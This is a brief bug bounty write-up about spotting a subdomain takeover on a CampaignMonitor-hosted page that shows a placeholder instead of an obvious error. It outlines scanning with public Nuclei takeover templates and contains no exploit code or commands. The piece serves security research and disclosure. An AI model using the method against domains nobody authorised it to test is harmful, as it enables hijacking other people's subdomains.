It's one of those takeover types that's subtle, but still valid. Instead of seeing a big "This page is not set up yet" warning, you often get a basic placeholder or redirect. And that's what makes it easy to miss.

My target had a redirect to _/login?ReturnUrl=%2F_ that didnt work apparently, so I got the basic placeholder of CampaignMonitor in the ss below.

### How I Found It

Simple stuff:

- Ran Nuclei's takeover templates on my VPS
- Got a match
- Visited the subdomain
- Saw this, looked up on github for similar cases and found one.

![None](https://miro.medium.com/v2/resize:fit:700/1*SVudDFZq7uO-lEqze6QieA.png)

Tool used:

> [ProjectDiscovery Nuclei template](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/takeovers/campaignmonitor-takeover.yaml)

----